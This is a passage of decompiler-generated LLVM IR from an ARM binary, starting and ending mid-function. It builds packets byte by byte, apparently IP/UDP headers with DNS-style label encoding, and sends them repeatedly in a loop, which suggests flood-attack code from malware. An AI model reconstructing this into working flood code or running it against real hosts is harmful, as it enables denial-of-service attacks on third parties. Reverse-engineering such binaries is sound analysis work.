  %v0_e09c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e09c, label %.thread21, label %bb143

bb143:                                            ; preds = %dec_label_pc_e040
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e0a0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0a0 = add i32 %v3_e0a0, 6
  %v5_e0a0 = inttoptr i32 %v4_e0a0 to i8*
  store i8 64, i8* %v5_e0a0, align 1
  %v0_e0a8.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t76 = trunc i32 %v0_e0a8.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_e040, %bb143
  %v0_e0a8.off0 = phi i8 [ %extract.t, %dec_label_pc_e040 ], [ %extract.t76, %bb143 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_e0a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0a8 = add i32 %v2_e0a8, 3
  %v4_e0a8 = inttoptr i32 %v3_e0a8 to i8*
  store i8 %v0_e0a8.off0, i8* %v4_e0a8, align 1
  store i32 %v4_e0ac, i32* %ip.global-to-local, align 4
  store i32 %v4_e0b0, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* %r4.global-to-local, align 4
  %v0_e0b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e0b8 = trunc i32 %v0_e0b8 to i8
  %v2_e0b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0b8 = add i32 %v2_e0b8, 8
  %v4_e0b8 = inttoptr i32 %v3_e0b8 to i8*
  store i8 %v1_e0b8, i8* %v4_e0b8, align 1
  %v0_e0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e0bc = trunc i32 %v0_e0bc to i8
  %v2_e0bc = load i32, i32* %r1.global-to-local, align 4
  %v3_e0bc = add i32 %v2_e0bc, 9
  %v4_e0bc = inttoptr i32 %v3_e0bc to i8*
  store i8 %v1_e0bc, i8* %v4_e0bc, align 1
  %v0_e0c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e0c0 = trunc i32 %v0_e0c0 to i8
  %v2_e0c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0c0 = add i32 %v2_e0c0, 5
  %v4_e0c0 = inttoptr i32 %v3_e0c0 to i8*
  store i8 %v1_e0c0, i8* %v4_e0c0, align 1
  %v0_e0c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e0c4, label %.thread22, label %bb144

.thread22:                                        ; preds = %.thread21
  %v2_e0c823 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_e0c823, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e0c8 = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_e0c8, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  %v3_e0d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0d0 = add i32 %v3_e0d0, 7
  %v5_e0d0 = inttoptr i32 %v4_e0d0 to i8*
  store i8 0, i8* %v5_e0d0, align 1
  %v0_e0d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_e0dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %.thread22, %bb144
  %v0_e0dc = phi i32 [ %v2_e0c823, %.thread22 ], [ %v0_e0dc.pre, %bb144 ]
  %v0_e0d8 = phi i32 [ %v4_df8c, %.thread22 ], [ %v0_e0d8.pre, %bb144 ]
  %v0_e0d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0d4 = add i32 %v0_e0d8, 41
  %v2_e0d8 = add i32 %v1_e0d4, %v0_e0d4
  store i32 %v2_e0d8, i32* %r4.global-to-local, align 4
  %v2_e0dc = add i32 %v0_e0d4, 12
  %v3_e0dc = inttoptr i32 %v2_e0dc to i32*
  store i32 %v0_e0dc, i32* %v3_e0dc, align 4
  store i32 %v4_e0e0, i32* %r2.global-to-local, align 4
  store i32 %v4_e0e4, i32* %r3.global-to-local, align 4
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0e8 = add i32 %v0_e0e8, 20
  store i32 %v1_e0e8, i32* %r0.global-to-local, align 4
  %v0_e0ec = load i32, i32* %ip.global-to-local, align 4
  %v1_e0ec = trunc i32 %v0_e0ec to i8
  %v3_e0ec = add i32 %v0_e0e8, 4
  %v4_e0ec = inttoptr i32 %v3_e0ec to i8*
  store i8 %v1_e0ec, i8* %v4_e0ec, align 1
  %v0_e0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0f0 = trunc i32 %v0_e0f0 to i8
  %v2_e0f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f0 = add i32 %v2_e0f0, 5
  %v4_e0f0 = inttoptr i32 %v3_e0f0 to i8*
  store i8 %v1_e0f0, i8* %v4_e0f0, align 1
  %v0_e0f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e0f4 = trunc i32 %v0_e0f4 to i8
  %v2_e0f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f4 = add i32 %v2_e0f4, 3
  %v4_e0f4 = inttoptr i32 %v3_e0f4 to i8*
  store i8 %v1_e0f4, i8* %v4_e0f4, align 1
  %v0_e0f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_e0f8 = trunc i32 %v0_e0f8 to i8
  %v2_e0f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f8 = add i32 %v2_e0f8, 2
  %v4_e0f8 = inttoptr i32 %v3_e0f8 to i8*
  store i8 %v1_e0f8, i8* %v4_e0f8, align 1
  %v0_e0fc = load i32, i32* %sl.global-to-local, align 4
  %v1_e0fc = trunc i32 %v0_e0fc to i8
  %v2_e0fc = load i32, i32* %r0.global-to-local, align 4
  %v3_e0fc = add i32 %v2_e0fc, 4
  %v4_e0fc = inttoptr i32 %v3_e0fc to i8*
  store i8 %v1_e0fc, i8* %v4_e0fc, align 1
  %v0_e100 = load i32, i32* @r5, align 4
  %v1_e100 = trunc i32 %v0_e100 to i8
  %v2_e100 = load i32, i32* %r1.global-to-local, align 4
  %v3_e100 = add i32 %v2_e100, 20
  %v4_e100 = inttoptr i32 %v3_e100 to i8*
  store i8 %v1_e100, i8* %v4_e100, align 1
  store i32 %v4_e108, i32* %r2.global-to-local, align 4
  %v1_e10c = load i32, i32* %r1.global-to-local, align 4
  %v2_e10c = add i32 %v1_e10c, 16
  %v3_e10c = inttoptr i32 %v2_e10c to i32*
  store i32 %stack_var_-2176.0, i32* %v3_e10c, align 4
  %v0_e110 = load i32, i32* %r2.global-to-local, align 4
  %v1_e110 = trunc i32 %v0_e110 to i8
  %v2_e110 = load i32, i32* %r0.global-to-local, align 4
  %v3_e110 = add i32 %v2_e110, 1
  %v4_e110 = inttoptr i32 %v3_e110 to i8*
  store i8 %v1_e110, i8* %v4_e110, align 1
  store i32 %v4_e114, i32* %lr.global-to-local, align 4
  store i32 %v4_df8c, i32* %r0.global-to-local, align 4
  %v0_e11c = load i32, i32* %r1.global-to-local, align 4
  %v1_e11c = add i32 %v0_e11c, 28
  store i32 %v1_e11c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_e128 = load i32, i32* %r8.global-to-local, align 4
  %v1_e128 = trunc i32 %v0_e128 to i8
  %v4_e128 = inttoptr i32 %v1_e11c to i8*
  store i8 %v1_e128, i8* %v4_e128, align 1
  %v0_e12c = load i32, i32* %r3.global-to-local, align 4
  %v1_e12c = trunc i32 %v0_e12c to i8
  %v2_e12c = load i32, i32* %ip.global-to-local, align 4
  %v3_e12c = add i32 %v2_e12c, 5
  %v4_e12c = inttoptr i32 %v3_e12c to i8*
  store i8 %v1_e12c, i8* %v4_e12c, align 1
  %v0_e130 = load i32, i32* %lr.global-to-local, align 4
  %v1_e130 = trunc i32 %v0_e130 to i8
  %v2_e130 = load i32, i32* %ip.global-to-local, align 4
  %v3_e130 = add i32 %v2_e130, 1
  %v4_e130 = inttoptr i32 %v3_e130 to i8*
  store i8 %v1_e130, i8* %v4_e130, align 1
  %v0_e134 = load i32, i32* %r3.global-to-local, align 4
  %v1_e134 = trunc i32 %v0_e134 to i8
  %v2_e134 = load i32, i32* %ip.global-to-local, align 4
  %v3_e134 = add i32 %v2_e134, 2
  %v4_e134 = inttoptr i32 %v3_e134 to i8*
  store i8 %v1_e134, i8* %v4_e134, align 1
  %v0_e138 = load i32, i32* @r6, align 4
  %v1_e138 = trunc i32 %v0_e138 to i8
  %v2_e138 = load i32, i32* %ip.global-to-local, align 4
  %v3_e138 = add i32 %v2_e138, 3
  %v4_e138 = inttoptr i32 %v3_e138 to i8*
  store i8 %v1_e138, i8* %v4_e138, align 1
  %v0_e13c = load i32, i32* @r6, align 4
  %v1_e13c = trunc i32 %v0_e13c to i8
  %v2_e13c = load i32, i32* %ip.global-to-local, align 4
  %v3_e13c = add i32 %v2_e13c, 4
  %v4_e13c = inttoptr i32 %v3_e13c to i8*
  store i8 %v1_e13c, i8* %v4_e13c, align 1
  %v0_e140 = load i32, i32* %r0.global-to-local, align 4
  %v1_e140 = trunc i32 %v0_e140 to i8
  %v2_e140 = load i32, i32* %r1.global-to-local, align 4
  %v3_e140 = add i32 %v2_e140, 40
  %v4_e140 = inttoptr i32 %v3_e140 to i8*
  store i8 %v1_e140, i8* %v4_e140, align 1
  store i32 %v6_dd94, i32* %r1.global-to-local, align 4
  %v0_e148 = load i32, i32* @r7, align 4
  store i32 %v0_e148, i32* %r2.global-to-local, align 4
  %v0_e14c = load i32, i32* %r4.global-to-local, align 4
  %v1_e14c = add i32 %v0_e14c, 1
  store i32 %v1_e14c, i32* %r0.global-to-local, align 4
  %v3_e150 = call i32 @function_12d58(i32 %v1_e14c, i32 %v6_dd94, i32 %v0_e148)
  store i32 %v3_e150, i32* %r0.global-to-local, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v1_e158 = load i32, i32* @r6, align 4
  %v9_e158 = icmp eq i32 %v2_dee0, %v1_e158
  store i1 %v9_e158, i1* %cpsr_z.global-to-local, align 1
  %v7_e15c = icmp sgt i32 %v2_dee0, %v1_e158
  store i32 %v1_e158, i32* %lr.global-to-local, align 4
  %v0_e16c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e16c, i32* %r2.global-to-local, align 4
  %extract.t78 = trunc i32 %v1_e158 to i8
  br i1 %v7_e15c, label %dec_label_pc_e168, label %dec_label_pc_e1a8

dec_label_pc_e168:                                ; preds = %bb145
  store i32 %v1_e158, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e174

dec_label_pc_e174:                                ; preds = %bb148, %dec_label_pc_e168
  %v0_e19085151 = phi i32 [ %v0_e19085152, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e18433 = phi i32 [ %v1_e19491, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e180.off0 = phi i8 [ %v1_e18056.off0, %bb148 ], [ %extract.t78, %dec_label_pc_e168 ]
  %v0_e18432 = phi i32 [ %v0_e184325488, %bb148 ], [ %v0_e16c, %dec_label_pc_e168 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_e178 = add i32 %v1_e18433, %v6_dd94
  %v3_e178 = inttoptr i32 %v2_e178 to i8*
  %v4_e178 = load i8, i8* %v3_e178, align 1
  %v6_e178 = zext i8 %v4_e178 to i32
  store i32 %v6_e178, i32* %r3.global-to-local, align 4
  %v7_e17c = icmp eq i8 %v4_e178, 46
  store i1 %v7_e17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e17c, label %bb146, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_e174
  %v2_e18434 = add i32 %v1_e18433, %v0_e18432
  store i32 %v2_e18434, i32* %r0.global-to-local, align 4
  br label %.thread35

bb146:                                            ; preds = %dec_label_pc_e174
  %v3_e180 = load i32, i32* %r2.global-to-local, align 4
  %v4_e180 = inttoptr i32 %v3_e180 to i8*
  store i8 %v1_e180.off0, i8* %v4_e180, align 1
  %v0_e188.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_e184 = load i32, i32* %r4.global-to-local, align 4
  %v1_e184 = load i32, i32* %r1.global-to-local, align 4
  %v2_e184 = add i32 %v1_e184, %v0_e184
  store i32 %v2_e184, i32* %r0.global-to-local, align 4
  br i1 %v0_e188.pr, label %bb147, label %bb146..thread35_crit_edge

bb146..thread35_crit_edge:                        ; preds = %bb146
  %v0_e19085.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb147:                                            ; preds = %bb146
  %v2_e188 = add i32 %v2_e184, 1
  store i32 %v2_e188, i32* %r2.global-to-local, align 4
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v0_e190 = load i32, i32* %lr.global-to-local, align 4
  %v1_e190 = add i32 %v0_e190, 1
  store i32 %v1_e190, i32* %ip.global-to-local, align 4
  %v1_e194 = add i32 %v1_e184, 1
  store i32 %v1_e194, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb148

.thread35:                                        ; preds = %bb146..thread35_crit_edge, %.thread31
  %v0_e19085 = phi i32 [ %v0_e19085.pre, %bb146..thread35_crit_edge ], [ %v0_e19085151, %.thread31 ]
  %v0_e194.ph = phi i32 [ %v1_e184, %bb146..thread35_crit_edge ], [ %v1_e18433, %.thread31 ]
  %v0_e1843254.ph = phi i32 [ %v0_e184, %bb146..thread35_crit_edge ], [ %v0_e18432, %.thread31 ]
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v1_e19086 = add i32 %v0_e19085, 1
  store i32 %v1_e19086, i32* %ip.global-to-local, align 4
  %v1_e19487 = add i32 %v0_e194.ph, 1
  store i32 %v1_e19487, i32* %r1.global-to-local, align 4
  %v2_e19c = urem i32 %v1_e19086, 256
  store i32 %v2_e19c, i32* %lr.global-to-local, align 4
  %extract.t81 = trunc i32 %v1_e19086 to i8
  br label %bb148

bb148:                                            ; preds = %bb147, %.thread35
  %v0_e19085152 = phi i32 [ 0, %bb147 ], [ %v2_e19c, %.thread35 ]
  %v1_e19491 = phi i32 [ %v1_e194, %bb147 ], [ %v1_e19487, %.thread35 ]
  %v0_e184325488 = phi i32 [ %v0_e184, %bb147 ], [ %v0_e1843254.ph, %.thread35 ]
  %v1_e18056.off0 = phi i8 [ 0, %bb147 ], [ %extract.t81, %.thread35 ]
  %v9_e1a0 = icmp eq i32 %v2_dee0, %v1_e19491
  store i1 %v9_e1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e1a0, label %dec_label_pc_e1a8.loopexit, label %dec_label_pc_e174

dec_label_pc_e1a8.loopexit:                       ; preds = %bb148
  %v2_e1a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e1a8.loopexit, %bb145
  %v2_e1a8 = phi i32 [ %v2_e1a8.pre, %dec_label_pc_e1a8.loopexit ], [ %v0_e16c, %bb145 ]
  %v0_e1a8.off0 = phi i8 [ %v1_e18056.off0, %dec_label_pc_e1a8.loopexit ], [ %extract.t78, %bb145 ]
  %v3_e1a8 = inttoptr i32 %v2_e1a8 to i8*
  store i8 %v0_e1a8.off0, i8* %v3_e1a8, align 1
  %v3_e1ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v0_e1b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_e1b4 = add i32 %v0_e1b4, %v2_dee0
  store i32 %v2_e1b4, i32* %r3.global-to-local, align 4
  %v1_e1b8 = add i32 %v3_e1ac, 1
  store i32 %v1_e1b8, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v9_e1c8 = icmp eq i32 %v1_dc80, %v1_e1b8
  store i1 %v9_e1c8, i1* %cpsr_z.global-to-local, align 1
  %v1_e1cc = add i32 %v2_e1b4, 2
  store i32 %v1_e1cc, i32* %r2.global-to-local, align 4
  %v4_e1d0 = inttoptr i32 %v1_e1cc to i8*
  store i8 0, i8* %v4_e1d0, align 1
  %v0_e1d4 = load i32, i32* @lr, align 4
  %v1_e1d4 = trunc i32 %v0_e1d4 to i8
  %v2_e1d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d4 = add i32 %v2_e1d4, 3
  %v4_e1d4 = inttoptr i32 %v3_e1d4 to i8*
  store i8 %v1_e1d4, i8* %v4_e1d4, align 1
  %v0_e1d8 = load i32, i32* @lr, align 4
  %v1_e1d8 = trunc i32 %v0_e1d8 to i8
  %v2_e1d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d8 = add i32 %v2_e1d8, 1
  %v4_e1d8 = inttoptr i32 %v3_e1d8 to i8*
  store i8 %v1_e1d8, i8* %v4_e1d8, align 1
  %v0_e1dc = load i32, i32* %ip.global-to-local, align 4
  %v1_e1dc = trunc i32 %v0_e1dc to i8
  %v2_e1dc = load i32, i32* %r2.global-to-local, align 4
  %v3_e1dc = add i32 %v2_e1dc, 2
  %v4_e1dc = inttoptr i32 %v3_e1dc to i8*
  store i8 %v1_e1dc, i8* %v4_e1dc, align 1
  %v0_e1e0 = load i32, i32* @r4, align 4
  store i32 %v0_e1e0, i32* %stack_var_-40, align 4
  %v8_e1e4 = icmp sgt i32 %v1_dc80, %v1_e1b8
  br i1 %v8_e1e4, label %dec_label_pc_e040, label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_e3b4
  %v4_e258.pre-phi = phi i32 [ %v4_e3b8, %dec_label_pc_e3b4 ], [ %v4_df8c, %dec_label_pc_e1a8 ]
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1f4, %dec_label_pc_e318, %dec_label_pc_e1e8
  br i1 %v2_df64, label %dec_label_pc_e1f4, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1f4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_e208 = load i32, i32* @fp, align 4
  %v1_e208 = add i32 %v0_e208, 27
  store i32 %v1_e208, i32* @sb, align 4
  %v1_e20c = add i32 %v0_e208, 47
  store i32 %v1_e20c, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e214

dec_label_pc_e214:                                ; preds = %dec_label_pc_e254.dec_label_pc_e214_crit_edge, %dec_label_pc_e1f8
  %v1_e234 = phi i32 [ %v1_e220.pre, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ 65535, %dec_label_pc_e1f8 ]
  %v1_e21c = phi i32 [ %v1_e304, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ 0, %dec_label_pc_e1f8 ]
  store i32 %v2_dc98, i32* %r3.global-to-local, align 4
  store i32 %v3_df54, i32* %r8.global-to-local, align 4
  %v4_e21c = mul i32 %v1_e21c, 4
  %v5_e21c = add i32 %v4_e21c, %v2_dc98
  %v6_e21c = inttoptr i32 %v5_e21c to i32*
  %v7_e21c = load i32, i32* %v6_e21c, align 4
  store i32 %v7_e21c, i32* @r4, align 4
  %v9_e220 = icmp eq i32 %v3_df54, %v1_e234
  store i1 %v9_e220, i1* %cpsr_z.global-to-local, align 1
  %v1_e224 = add i32 %v7_e21c, 20
  store i32 %v1_e224, i32* @r5, align 4
  %v1_e228 = add i32 %v7_e21c, 28
  store i32 %v1_e228, i32* @r8, align 4
  br i1 %v9_e220, label %dec_label_pc_e328, label %dec_label_pc_e230

dec_label_pc_e230:                                ; preds = %dec_label_pc_e214
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v9_e234 = icmp eq i32 %v3_df58, %v1_e234
  store i1 %v9_e234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e234, label %dec_label_pc_e344, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e328.dec_label_pc_e23c_crit_edge, %dec_label_pc_e230
  %v1_e240 = phi i32 [ %v1_e240.pre, %dec_label_pc_e328.dec_label_pc_e23c_crit_edge ], [ %v1_e234, %dec_label_pc_e230 ]
  store i32 %v3_df5c, i32* @lr, align 4
  %v9_e240 = icmp eq i32 %v3_df5c, %v1_e240
  store i1 %v9_e240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e240, label %dec_label_pc_e360, label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %dec_label_pc_e344.dec_label_pc_e248_crit_edge, %dec_label_pc_e23c
  %v1_e24c = phi i32 [ %v1_e24c.pre, %dec_label_pc_e344.dec_label_pc_e248_crit_edge ], [ %v1_e240, %dec_label_pc_e23c ]
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v9_e24c = icmp eq i32 %v3_df60, %v1_e24c
  store i1 %v9_e24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e24c, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248, %dec_label_pc_e37c
  %v0_e254 = load i32, i32* @r4, align 4
  %v1_e254 = add i32 %v0_e254, 41
  store i32 %v1_e254, i32* %r0.global-to-local, align 4
  store i32 %v4_e258.pre-phi, i32* %r1.global-to-local, align 4
  %v2_e25c = call i32 @function_ff14(i32 %v1_e254, i32 %v4_e258.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e264 = load i32, i32* @r7, align 4
  %v1_e264 = trunc i32 %v0_e264 to i8
  %v2_e264 = load i32, i32* @r4, align 4
  %v3_e264 = add i32 %v2_e264, 10
  %v4_e264 = inttoptr i32 %v3_e264 to i8*
  store i8 %v1_e264, i8* %v4_e264, align 1
  %v0_e268 = load i32, i32* @r7, align 4
  %v1_e268 = trunc i32 %v0_e268 to i8
  %v2_e268 = load i32, i32* @r4, align 4
  %v3_e268 = add i32 %v2_e268, 11
  %v4_e268 = inttoptr i32 %v3_e268 to i8*
  store i8 %v1_e268, i8* %v4_e268, align 1
  %v0_e26c = load i32, i32* @r4, align 4
  store i32 %v0_e26c, i32* @r0, align 4
  %v2_e270 = call i32 @function_e424(i32 %v0_e26c, i32 20)
  %v3_e270 = trunc i32 %v2_e270 to i8
  store i32 %v2_e270, i32* %r0.global-to-local, align 4
  %v4_e274 = sdiv i32 %v2_e270, 256
  store i32 %v4_e274, i32* %r3.global-to-local, align 4
  %v1_e278 = trunc i32 %v4_e274 to i8
  %v2_e278 = load i32, i32* @r4, align 4
  %v3_e278 = add i32 %v2_e278, 11
  %v4_e278 = inttoptr i32 %v3_e278 to i8*
  store i8 %v1_e278, i8* %v4_e278, align 1
  %v3_e27c = load i32, i32* @r4, align 4
  %v4_e27c = add i32 %v3_e27c, 10
  %v5_e27c = inttoptr i32 %v4_e27c to i8*
  store i8 %v3_e270, i8* %v5_e27c, align 1
  %v0_e280 = load i32, i32* @r7, align 4
  %v1_e280 = trunc i32 %v0_e280 to i8
  %v2_e280 = load i32, i32* @r5, align 4
  %v3_e280 = add i32 %v2_e280, 6
  %v4_e280 = inttoptr i32 %v3_e280 to i8*
  store i8 %v1_e280, i8* %v4_e280, align 1
  %v0_e284 = load i32, i32* @r7, align 4
  %v1_e284 = trunc i32 %v0_e284 to i8
  %v2_e284 = load i32, i32* @r5, align 4
  %v3_e284 = add i32 %v2_e284, 7
  %v4_e284 = inttoptr i32 %v3_e284 to i8*
  store i8 %v1_e284, i8* %v4_e284, align 1
  %v0_e288 = load i32, i32* @r4, align 4
  %v1_e288 = add i32 %v0_e288, 24
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 25
  %v2_e28c = inttoptr i32 %v1_e28c to i8*
  %v3_e28c = load i8, i8* %v2_e28c, align 1
  %v4_e28c = zext i8 %v3_e28c to i32
  %v0_e290 = load i32, i32* @r5, align 4
  store i32 %v0_e290, i32* @r1, align 4
  %v4_e294 = mul nuw nsw i32 %v4_e28c, 256
  %v5_e294 = or i32 %v4_e294, %v4_e288
  store i32 %v5_e294, i32* %r2.global-to-local, align 4
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v0_e29c = load i32, i32* @sb, align 4
  store i32 %v0_e29c, i32* %r3.global-to-local, align 4
  %v4_e2a0 = call i32 @function_e480(i32 %v0_e288, i32 %v0_e290, i32 %v5_e294, i32 %v0_e29c)
  %v5_e2a0 = trunc i32 %v4_e2a0 to i8
  store i32 %v4_e2a0, i32* %r0.global-to-local, align 4
  %v3_e2a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_e2b4 = mul i32 %v3_e2a4, 24
  %v2_e2b8 = add i32 %v5_e2b4, %arg2
  store i32 %v2_e2b8, i32* %lr.global-to-local, align 4
  %v4_e2bc = sdiv i32 %v4_e2a0, 256
  store i32 %v4_e2bc, i32* %r3.global-to-local, align 4
  %v3_e2c0 = load i32, i32* @r5, align 4
  %v4_e2c0 = add i32 %v3_e2c0, 6
  %v5_e2c0 = inttoptr i32 %v4_e2c0 to i8*
  store i8 %v5_e2a0, i8* %v5_e2c0, align 1
  %v0_e2c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2c4 = trunc i32 %v0_e2c4 to i8
  %v2_e2c4 = load i32, i32* @r5, align 4
  %v3_e2c4 = add i32 %v2_e2c4, 7
  %v4_e2c4 = inttoptr i32 %v3_e2c4 to i8*
  store i8 %v1_e2c4, i8* %v4_e2c4, align 1
  %v0_e2c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2c8 = load i32, i32* %lr.global-to-local, align 4
  %v2_e2c8 = add i32 %v1_e2c8, 4
  %v3_e2c8 = inttoptr i32 %v2_e2c8 to i32*
  store i32 %v0_e2c8, i32* %v3_e2c8, align 4
  %v0_e2cc = load i32, i32* @r4, align 4
  %v1_e2cc = add i32 %v0_e2cc, 20
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  %v3_e2d0 = udiv i32 %v3_e2cc, 65536
  store i32 %v3_e2d0, i32* %r3.global-to-local, align 4
  %v3_e2d412 = udiv i32 %v3_e2cc, 16777216
  %v1_e2d8 = trunc i32 %v3_e2d412 to i8
  %v2_e2d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_e2d8 = add i32 %v2_e2d8, 3
  %v4_e2d8 = inttoptr i32 %v3_e2d8 to i8*
  store i8 %v1_e2d8, i8* %v4_e2d8, align 1
  %v0_e2dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2dc = trunc i32 %v0_e2dc to i8
  %v2_e2dc = load i32, i32* %lr.global-to-local, align 4
  %v3_e2dc = add i32 %v2_e2dc, 2
  %v4_e2dc = inttoptr i32 %v3_e2dc to i8*
  store i8 %v1_e2dc, i8* %v4_e2dc, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e2e8 = load i32, i32* @r4, align 4
  store i32 %v0_e2e8, i32* %r1.global-to-local, align 4
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v0_e2f0 = load i32, i32* @sl, align 4
  store i32 %v0_e2f0, i32* %r2.global-to-local, align 4
  %v0_e2f4 = load i32, i32* %lr.global-to-local, align 4
  %v6_e2fc = inttoptr i32 %v0_e2e8 to i32*
  %v7_e2fc = call i32 @function_13f2c(i32 %v3_def4, i32* %v6_e2fc, i32 %v0_e2f0, i32 16384, i32 %v0_e2f4, i32 16)
  %v3_e300 = load i32, i32* %stack_var_-40, align 4
  %v1_e304 = add i32 %v3_e300, 1
  store i32 %v1_e304, i32* %r0.global-to-local, align 4
  store i32 %v1_dc80, i32* %r3.global-to-local, align 4
  %v9_e30c = icmp eq i32 %v1_dc80, %v1_e304
  store i1 %v9_e30c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e304, i32* %stack_var_-40, align 4
  %v8_e314 = icmp sgt i32 %v1_dc80, %v1_e304
  br i1 %v8_e314, label %dec_label_pc_e254.dec_label_pc_e214_crit_edge, label %dec_label_pc_e318

dec_label_pc_e254.dec_label_pc_e214_crit_edge:    ; preds = %dec_label_pc_e254
  %v1_e220.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e214

dec_label_pc_e318:                                ; preds = %dec_label_pc_e254
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e328:                                ; preds = %dec_label_pc_e214
  %v0_e328 = call i32 @function_fe60()
  %v1_e328 = trunc i32 %v0_e328 to i8
  store i32 %v0_e328, i32* %r0.global-to-local, align 4
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v4_e330 = sdiv i32 %v0_e328, 256
  store i32 %v4_e330, i32* %r3.global-to-local, align 4
  %v1_e334 = load i32, i32* @r6, align 4
  %v9_e334 = icmp eq i32 %v3_df58, %v1_e334
